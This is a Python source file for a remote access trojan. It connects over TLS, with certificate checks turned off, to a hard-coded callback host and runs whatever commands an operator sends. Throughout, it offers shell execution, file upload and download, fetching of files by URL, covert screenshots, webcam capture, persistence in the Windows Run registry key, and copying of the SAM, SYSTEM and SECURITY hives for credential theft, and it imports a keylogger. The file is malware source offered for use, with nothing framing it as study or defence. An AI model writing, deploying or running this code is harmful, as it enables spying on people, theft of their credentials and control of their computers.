import os
import sys
import ssl
import json
import time
import ctypes
import shutil
import socket
import struct
import platform
import requests
import subprocess
from mss import mss
import cv2

import keylogger  # assumed to exist

# === CONFIGURATION ===
SERVER_HOST = 'callback.scarletpug.com'
SERVER_PORT = 443
RECONNECT_DELAY = 5

# === JSON Framed Socket I/O ===
def recvall(sock, length):
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            raise ConnectionError("Socket closed unexpectedly during recvall")
        data += packet
    return data

def reliable_send(sock, data):
    try:
        json_data = json.dumps(data).encode()
        sock.sendall(f"{len(json_data):<16}".encode())  # 16-byte header
        sock.sendall(json_data)
        print(f"[DEBUG] Sent: {data}")
    except Exception as e:
        print(f"[ERROR] Send failed: {e}")

def reliable_recv(sock):
    try:
        header = recvall(sock, 16)
        length = int(header.decode().strip())
        payload = recvall(sock, length)
        data = json.loads(payload.decode())
        print(f"[DEBUG] Received: {data}")
        return data
    except Exception as e:
        print(f"[ERROR] Receive failed: {e}")
        return None

# === Command Execution Features ===
def download_file(sock, file_name):
    print(f"[DEBUG] Downloading to {file_name}")
    with open(file_name, 'wb') as f:
        sock.settimeout(2)
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        finally:
            sock.settimeout(None)

def upload_file(sock, file_name):
    print(f"[DEBUG] Uploading {file_name}")
    with open(file_name, 'rb') as f:
        sock.sendall(f.read())

def download_url(url):
    file_name = url.split('/')[-1]
    r = requests.get(url, timeout=10)
    with open(file_name, 'wb') as f:
        f.write(r.content)
    print(f"[DEBUG] Downloaded {file_name} from {url}")
    return file_name

def screenshot():
    with mss(display=":0.0" if platform.system() == "Linux" else None) as sct:
        output = '.screen.png'
        sct.shot(output=output)
        return output

def capture_webcam():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return None
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    path = '.webcam.png'
    _, buffer = cv2.imencode('.png', frame)
    with open(path, 'wb') as f:
        f.write(buffer.tobytes())
    return path

def persist(reg_name, copy_name):
    location = os.environ['APPDATA'] + '\\' + copy_name
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {reg_name} /d "{location}" /f', shell=True)
        return f"[+] Persistence created: {reg_name}"
    return "[+] Persistence already exists"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_sam_dump():
    if not is_admin():
        return "[!!] Admin required for SAM dump"
    try:
        with open(r'C:\Windows\System32\config\SAM', 'rb') as sam, \
             open(r'C:\Windows\System32\config\SYSTEM', 'rb') as system, \
             open(r'C:\Windows\System32\config\SECURITY', 'rb') as security:
            return sam.read(), system.read(), security.read()
    except Exception as e:
        return f"[ERROR] Could not access hives: {e}"

# === Main Shell Loop ===
def shell(sock):
    while True:
        command = reliable_recv(sock)
        if not command:
            break
        try:
            if command == 'quit':
                break
            elif command.startswith('cd '):
                os.chdir(command[3:])
            elif command.startswith('upload '):
                download_file(sock, command[7:])
            elif command.startswith('download '):
                upload_file(sock, command[9:])
            elif command.startswith('get '):
                file = download_url(command[4:])
                reliable_send(sock, f"[+] Downloaded {file}")
            elif command == 'screenshot':
                path = screenshot()
                upload_file(sock, path)
                os.remove(path)
            elif command == 'webcam':
                path = capture_webcam()
                if path:
                    upload_file(sock, path)
                    os.remove(path)
                else:
                    reliable_send(sock, "[ERROR] Webcam unavailable")
            elif command.startswith('persistence '):
                reg, exe = command[12:].split()
                msg = persist(reg, exe)
                reliable_send(sock, msg)
            elif command == 'check':
                reliable_send(sock, '[+] Admin Privileges' if is_admin() else '[!!] Not Admin')
            elif command.startswith('start '):
                subprocess.Popen(command[6:], shell=True)
                reliable_send(sock, '[+] Process started')
            elif command == 'get_sam_dump':
                data = get_sam_dump()
                reliable_send(sock, data)
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate()
                reliable_send(sock, (out + err).decode())
        except Exception as e:
            print(f"[ERROR] Shell command error: {e}")
            reliable_send(sock, f"[ERROR] {e}")

# === TLS Connection + Handshake ===
def handshake(sock):
    reliable_send(sock, {"status": "connected", "platform": platform.system()})
    print("[DEBUG] Handshake sent")

def connection():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            print(f"[DEBUG] Connecting to {SERVER_HOST}:{SERVER_PORT}")
            with socket.create_connection((SERVER_HOST, SERVER_PORT)) as raw_sock:
                with context.wrap_socket(raw_sock, server_hostname=SERVER_HOST) as sock:
                    print("[+] Connected over TLS")
                    handshake(sock)
                    shell(sock)
        except Exception as e:
            print(f"[ERROR] Connection error: {e}")
            time.sleep(RECONNECT_DELAY + int.from_bytes(os.urandom(1), 'little') % 5)

connection()
